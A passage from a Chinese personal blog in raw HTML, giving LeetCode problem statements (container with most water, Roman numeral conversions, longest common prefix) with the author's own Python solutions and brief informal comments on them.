class="katex-mathml"><math><semantics><mrow><msub><mi>a</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>2</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>a</mi><mi>n</mi></msub><mi>a</mi></mrow><annotation encoding="application/x-tex">a_1, a_2, ..., a_na</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">a</span></span></span></span> ，每个数代表坐标中的一个点<code>(i,ai)</code>。在坐标内画<code>n</code>条垂直线，垂直线i的两个端点分别为<code>(i,ai)</code>和<code>(i, 0)</code>。找出其中的两条线，使得它们与x轴共同构成的容器可以容纳最多的水。</p><p>说明：你不能倾斜容器。</p><p>示例 1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：[1,8,6,2,5,4,8,3,7]</span><br><span class="line">输出：49 </span><br><span class="line">解释：图中垂直线代表输入数组 [1,8,6,2,5,4,8,3,7]。在此情况下，容器能够容纳水（表示为蓝色部分）的最大值为49。</span><br></pre></td></tr></table></figure><p>示例 2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：height &#x3D; [1,1]</span><br><span class="line">输出：1</span><br></pre></td></tr></table></figure><p>示例 3：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：height &#x3D; [4,3,2,1,4]</span><br><span class="line">输出：16</span><br></pre></td></tr></table></figure><p>示例 4：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：height &#x3D; [1,2,1]</span><br><span class="line">输出：2</span><br></pre></td></tr></table></figure><p>来源：力扣（LeetCode）<br />链接：<a href="https://leetcode-cn.com/problems/container-with-most-water">https://leetcode-cn.com/problems/container-with-most-water</a><br />著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">maxArea</span>(<span class="params">self, height</span>) -&gt; int:</span></span><br><span class="line">length = <span class="built_in">len</span>(height)</span><br><span class="line">area = <span class="number">0</span></span><br><span class="line">h = <span class="number">0</span></span><br><span class="line">index1 = <span class="number">0</span></span><br><span class="line">index2 = length - <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line"><span class="keyword">if</span> height[index1] &gt;= height[index2]:</span><br><span class="line">h = height[index2]</span><br><span class="line">index2 -= <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">h = height[index1]</span><br><span class="line">index1 += <span class="number">1</span></span><br><span class="line">temp = h * (index2 + <span class="number">1</span> - index1)</span><br><span class="line"><span class="keyword">if</span> temp &gt; area:</span><br><span class="line">area = temp</span><br><span class="line"><span class="keyword">return</span>(area)</span><br></pre></td></tr></table></figure><p>自己逻辑都还没理清楚，代码就能跑了<br />一开始想二维查找梭哈，然后死在一个长度5000的列表上了<br />旧症复发了属于是<br />然后开始用一维的角度去思考<br />AB分别为初始值在列表两端的下标，两边往中间回缩（中间往两边跑也行）<br />A大就挪B，反之亦然</p><hr /><h1 id="整数转罗马数字"><a class="markdownIt-Anchor" href="#整数转罗马数字"></a> <a href="https://leetcode-cn.com/problems/integer-to-roman">整数转罗马数字</a></h1><p>罗马数字包含以下七种字符:<code>I</code>，<code>V</code>，<code>X</code>，<code>L</code>，<code>C</code>，<code>D</code>和<code>M</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">字符数值</span><br><span class="line">I1</span><br><span class="line">V5</span><br><span class="line">X10</span><br><span class="line">L50</span><br><span class="line">C100</span><br><span class="line">D500</span><br><span class="line">M1000</span><br></pre></td></tr></table></figure><p>例如，罗马数字2写做<code>II</code>，即为两个并列的1。12写做<code>XII</code>，即为<code>X+II</code>。 27写做<code>XXVII</code>, 即为<code>XX+V+II</code>。</p><p>通常情况下，罗马数字中小的数字在大的数字的右边。但也存在特例，例如4不写做<code>IIII</code>，而是<code>IV</code>。数字1在数字5的左边，所表示的数等于大数5减小数1得到的数值4 。同样地，数字9表示为<code>IX</code>。这个特殊的规则只适用于以下六种情况：</p><ul><li><code>I</code>可以放在<code>V</code>(5) 和<code>X</code>(10) 的左边，来表示 4 和 9。</li><li><code>X</code>可以放在<code>L</code>(50) 和<code>C</code>(100) 的左边，来表示 40 和90。</li><li><code>C</code>可以放在<code>D</code>(500) 和<code>M</code>(1000) 的左边，来表示400 和900。</li></ul><p>给你一个整数，将其转为罗马数字。</p><p>示例1:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入:num &#x3D; 3</span><br><span class="line">输出: &quot;III&quot;</span><br></pre></td></tr></table></figure><p>示例2:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入:num &#x3D; 4</span><br><span class="line">输出: &quot;IV&quot;</span><br></pre></td></tr></table></figure><p>示例3:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入:num &#x3D; 9</span><br><span class="line">输出: &quot;IX&quot;</span><br></pre></td></tr></table></figure><p>示例4:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入:num &#x3D; 58</span><br><span class="line">输出: &quot;LVIII&quot;</span><br><span class="line">解释: L &#x3D; 50, V &#x3D; 5, III &#x3D; 3.</span><br></pre></td></tr></table></figure><p>示例5:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入:num &#x3D; 1994</span><br><span class="line">输出: &quot;MCMXCIV&quot;</span><br><span class="line">解释: M &#x3D; 1000, CM &#x3D; 900, XC &#x3D; 90, IV &#x3D; 4.</span><br></pre></td></tr></table></figure><p>来源：力扣（LeetCode）<br />链接：<a href="https://leetcode-cn.com/problems/integer-to-roman">https://leetcode-cn.com/problems/integer-to-roman</a><br />著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">intToRoman</span>(<span class="params">self, num: <span class="built_in">int</span></span>) -&gt; str:</span></span><br><span class="line">num_list = []</span><br><span class="line"><span class="keyword">while</span> num != <span class="number">0</span>:</span><br><span class="line">num_list.append(num % <span class="number">10</span>)</span><br><span class="line">num //= <span class="number">10</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(num_list)):</span><br><span class="line"><span class="keyword">if</span> _ == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">if</span> num_list[_] == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">elif</span> num_list[_] &lt;= <span class="number">3</span>:</span><br><span class="line">result = <span class="string">&quot;I&quot;</span> * num_list[_] + result</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">diff = num_list[_] - <span class="number">5</span></span><br><span class="line">mod = num_list[_] % <span class="number">5</span></span><br><span class="line"><span class="keyword">if</span> diff == -<span class="number">1</span>:</span><br><span class="line">result =  <span class="string">&quot;IV&quot;</span> + result</span><br><span class="line"><span class="keyword">elif</span> mod &lt; <span class="number">4</span>:</span><br><span class="line">result = <span class="string">&quot;V&quot;</span> + <span class="string">&quot;I&quot;</span> * mod + result</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">result = <span class="string">&quot;IX&quot;</span> + result</span><br><span class="line"><span class="keyword">elif</span> _ == <span class="number">1</span>:</span><br><span class="line"><span class="keyword">if</span> num_list[_] == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">elif</span> num_list[_] &lt;= <span class="number">3</span>:</span><br><span class="line">result = <span class="string">&quot;X&quot;</span> * num_list[_] + result</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">diff = num_list[_] - <span class="number">5</span></span><br><span class="line">mod = num_list[_] % <span class="number">5</span></span><br><span class="line"><span class="keyword">if</span> diff == -<span class="number">1</span>:</span><br><span class="line">result = <span class="string">&quot;XL&quot;</span> + result</span><br><span class="line"><span class="keyword">elif</span> mod &lt; <span class="number">4</span>:</span><br><span class="line">result = <span class="string">&quot;L&quot;</span> + <span class="string">&quot;X&quot;</span> * mod + result</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">result = <span class="string">&quot;XC&quot;</span> + result</span><br><span class="line"><span class="keyword">elif</span> _ == <span class="number">2</span>:</span><br><span class="line"><span class="keyword">if</span> num_list[_] == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">elif</span> num_list[_] &lt;= <span class="number">3</span>:</span><br><span class="line">result = <span class="string">&quot;C&quot;</span> * num_list[_] + result</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">diff = num_list[_] - <span class="number">5</span></span><br><span class="line">mod = num_list[_] % <span class="number">5</span></span><br><span class="line"><span class="keyword">if</span> diff == -<span class="number">1</span>:</span><br><span class="line">result = <span class="string">&quot;CD&quot;</span> + result</span><br><span class="line"><span class="keyword">elif</span> mod &lt; <span class="number">4</span>:</span><br><span class="line">result = <span class="string">&quot;D&quot;</span> + <span class="string">&quot;C&quot;</span> * mod + result</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">result = <span class="string">&quot;CM&quot;</span> + result</span><br><span class="line"><span class="keyword">elif</span> _ == <span class="number">3</span>:</span><br><span class="line">result = <span class="string">&quot;M&quot;</span> * num_list[_] + result</span><br><span class="line"><span class="keyword">return</span>(result)</span><br></pre></td></tr></table></figure><p>一个挺中庸的解决方案<br />为了解决问题而解决问题</p><hr /><h1 id="罗马数字转整数"><a class="markdownIt-Anchor" href="#罗马数字转整数"></a> <a href="https://leetcode-cn.com/problems/roman-to-integer">罗马数字转整数</a></h1><p>罗马数字包含以下七种字符:<code>I</code>，<code>V</code>，<code>X</code>，<code>L</code>，<code>C</code>，<code>D</code>和<code>M</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">字符数值</span><br><span class="line">I1</span><br><span class="line">V5</span><br><span class="line">X10</span><br><span class="line">L50</span><br><span class="line">C100</span><br><span class="line">D500</span><br><span class="line">M1000</span><br></pre></td></tr></table></figure><p>例如，罗马数字2写做<code>II</code>，即为两个并列的1。12写做<code>XII</code>，即为<code>X+II</code>。 27写做<code>XXVII</code>, 即为<code>XX+V+II</code>。</p><p>通常情况下，罗马数字中小的数字在大的数字的右边。但也存在特例，例如4不写做<code>IIII</code>，而是<code>IV</code>。数字1在数字5的左边，所表示的数等于大数5减小数1得到的数值4 。同样地，数字9表示为<code>IX</code>。这个特殊的规则只适用于以下六种情况：</p><ul><li><code>I</code>可以放在<code>V</code>(5) 和<code>X</code>(10) 的左边，来表示 4 和 9。</li><li><code>X</code>可以放在<code>L</code>(50) 和<code>C</code>(100) 的左边，来表示 40 和90。</li><li><code>C</code>可以放在<code>D</code>(500) 和<code>M</code>(1000) 的左边，来表示400 和900。</li></ul><p>给定一个罗马数字，将其转换成整数。输入确保在 1到 3999 的范围内。<br />示例1:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入:&quot;III&quot;</span><br><span class="line">输出: 3</span><br></pre></td></tr></table></figure><p>示例2:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入:&quot;IV&quot;</span><br><span class="line">输出: 4</span><br></pre></td></tr></table></figure><p>示例3:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入:&quot;IX&quot;</span><br><span class="line">输出: 9</span><br></pre></td></tr></table></figure><p>示例4:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入:&quot;LVIII&quot;</span><br><span class="line">输出: 58</span><br><span class="line">解释: L &#x3D; 50, V&#x3D; 5, III &#x3D; 3.</span><br></pre></td></tr></table></figure><p>示例5:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入:&quot;MCMXCIV&quot;</span><br><span class="line">输出: 1994</span><br><span class="line">解释: M &#x3D; 1000, CM &#x3D; 900, XC &#x3D; 90, IV &#x3D; 4.</span><br></pre></td></tr></table></figure><p>来源：力扣（LeetCode）<br />链接：<a href="https://leetcode-cn.com/problems/roman-to-integer">https://leetcode-cn.com/problems/roman-to-integer</a><br />著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">romanToInt</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; int:</span></span><br><span class="line">length = <span class="built_in">len</span>(s)</span><br><span class="line">number = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> s[<span class="number">0</span>] == <span class="string">&quot;M&quot;</span>:</span><br><span class="line">_ = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> s[_] == <span class="string">&quot;M&quot;</span>:</span><br><span class="line">_ += <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> _ == length:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">s = s[_:]</span><br><span class="line">number += <span class="number">1000</span> * _</span><br><span class="line">length -= _</span><br><span class="line"><span class="keyword">if</span> length == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span>(number)</span><br><span class="line"><span class="keyword">if</span> s[<span class="number">0</span>] == <span class="string">&quot;C&quot;</span>:</span><br><span class="line"><span class="keyword">if</span> length == <span class="number">1</span>:</span><br><span class="line">number += <span class="number">100</span></span><br><span class="line">length -= <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> s[<span class="number">1</span>] == <span class="string">&quot;M&quot;</span>:</span><br><span class="line">number += <span class="number">900</span></span><br><span class="line">length -= <span class="number">2</span></span><br><span class="line">s = s[<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">elif</span> s[<span class="number">1</span>] == <span class="string">&quot;D&quot;</span>:</span><br><span class="line">number += <span class="number">400</span></span><br><span class="line">length -= <span class="number">2</span></span><br><span class="line">s = s[<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">_ = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> s[_] == <span class="string">&quot;C&quot;</span>:</span><br><span class="line">_ += <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> _ == length:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">s = s[_:]</span><br><span class="line">number += <span class="number">100</span> * _</span><br><span class="line">length -= _</span><br><span class="line"><span class="keyword">if</span> length == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span>(number)</span><br><span class="line"><span class="keyword">if</span> s[<span class="number">0</span>] == <span class="string">&quot;D&quot;</span>:</span><br><span class="line">number += <span class="number">500</span></span><br><span class="line">length -= <span class="number">1</span></span><br><span class="line">s = s[<span class="number">1</span>:]</span><br><span class="line"><span class="keyword">if</span> length == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span>(number)</span><br><span class="line">_ = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> s[_] == <span class="string">&quot;C&quot;</span>:</span><br><span class="line"><span class="keyword">while</span> s[_] == <span class="string">&quot;C&quot;</span>:</span><br><span class="line">_ += <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> _ == length:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">s = s[_:]</span><br><span class="line">number += <span class="number">100</span> * _</span><br><span class="line">length -= _</span><br><span class="line"><span class="keyword">if</span> length == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span>(number)</span><br><span class="line"><span class="keyword">if</span> s[<span class="number">0</span>] == <span class="string">&quot;X&quot;</span>:</span><br><span class="line"><span class="keyword">if</span> length == <span class="number">1</span>:</span><br><span class="line">number += <span class="number">10</span></span><br><span class="line">length -= <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> s[<span class="number">1</span>] == <span class="string">&quot;C&quot;</span>:</span><br><span class="line">number += <span class="number">90</span></span><br><span class="line">length -= <span class="number">2</span></span><br><span class="line">s = s[<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">elif</span> s[<span class="number">1</span>] == <span class="string">&quot;L&quot;</span>:</span><br><span class="line">number += <span class="number">40</span></span><br><span class="line">length -= <span class="number">2</span></span><br><span class="line">s = s[<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">_ = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> s[_] == <span class="string">&quot;X&quot;</span>:</span><br><span class="line">_ += <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> _ == length:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">s = s[_:]</span><br><span class="line">number += <span class="number">10</span> * _</span><br><span class="line">length -= _</span><br><span class="line"><span class="keyword">if</span> length == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span>(number)</span><br><span class="line"><span class="keyword">if</span> s[<span class="number">0</span>] == <span class="string">&quot;L&quot;</span>:</span><br><span class="line">number += <span class="number">50</span></span><br><span class="line">length -= <span class="number">1</span></span><br><span class="line">s = s[<span class="number">1</span>:]</span><br><span class="line"><span class="keyword">if</span> length == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span>(number)</span><br><span class="line">_ = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> s[_] == <span class="string">&quot;X&quot;</span>:</span><br><span class="line"><span class="keyword">while</span> s[_] == <span class="string">&quot;X&quot;</span>:</span><br><span class="line">_ += <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> _ == length:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">s = s[_:]</span><br><span class="line">number += <span class="number">10</span> * _</span><br><span class="line">length -= _</span><br><span class="line"><span class="keyword">if</span> length == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span>(number)</span><br><span class="line"><span class="keyword">if</span> s[<span class="number">0</span>] == <span class="string">&quot;I&quot;</span>:</span><br><span class="line"><span class="keyword">if</span> length == <span class="number">1</span>:</span><br><span class="line">number += <span class="number">1</span></span><br><span class="line">length -= <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> s[<span class="number">1</span>] == <span class="string">&quot;X&quot;</span>:</span><br><span class="line">number += <span class="number">9</span></span><br><span class="line">length -= <span class="number">2</span></span><br><span class="line">s = s[<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">elif</span> s[<span class="number">1</span>] == <span class="string">&quot;V&quot;</span>:</span><br><span class="line">number += <span class="number">4</span></span><br><span class="line">length -= <span class="number">2</span></span><br><span class="line">s = s[<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">_ = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> s[_] == <span class="string">&quot;I&quot;</span>:</span><br><span class="line">_ += <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> _ == length:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">s = s[_:]</span><br><span class="line">number += <span class="number">1</span> * _</span><br><span class="line">length -= _</span><br><span class="line"><span class="keyword">if</span> length == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span>(number)</span><br><span class="line"><span class="keyword">if</span> s[<span class="number">0</span>] == <span class="string">&quot;V&quot;</span>:</span><br><span class="line">number += <span class="number">5</span></span><br><span class="line">length -= <span class="number">1</span></span><br><span class="line">s = s[<span class="number">1</span>:]</span><br><span class="line"><span class="keyword">if</span> length == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span>(number)</span><br><span class="line">_ = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> s[_] == <span class="string">&quot;I&quot;</span>:</span><br><span class="line"><span class="keyword">while</span> s[_] == <span class="string">&quot;I&quot;</span>:</span><br><span class="line">_ += <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> _ == length:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">s = s[_:]</span><br><span class="line">number += <span class="number">1</span> * _</span><br><span class="line">length -= _</span><br><span class="line"><span class="keyword">if</span> length == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span>(number)</span><br></pre></td></tr></table></figure><p>实在想不出啥好的算法了<br />只能摆烂了</p><hr /><h1 id="最长公共前缀"><a class="markdownIt-Anchor" href="#最长公共前缀"></a> <a href="https://leetcode-cn.com/problems/longest-common-prefix">最长公共前缀</a></h1><p>编写一个函数来查找字符串数组中的最长公共前缀。</p><p>如果不存在公共前缀，返回空字符串<code>&quot;&quot;</code>。</p><p>示例 1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：strs &#x3D; [&quot;flower&quot;,&quot;flow&quot;,&quot;flight&quot;]</span><br><span class="line">输出：&quot;fl&quot;</span><br></pre></td></tr></table></figure><p>示例 2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：strs &#x3D; [&quot;dog&quot;,&quot;racecar&quot;,&quot;car&quot;]</span><br><span class="line">输出：&quot;&quot;</span><br><span class="line">解释：输入不存在公共前缀。</span><br></pre></td></tr></table></figure><p>来源：力扣（LeetCode）<br />链接：<a href="https://leetcode-cn.com/problems/longest-common-prefix">https://leetcode-cn.com/problems/longest-common-prefix</a><br />著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 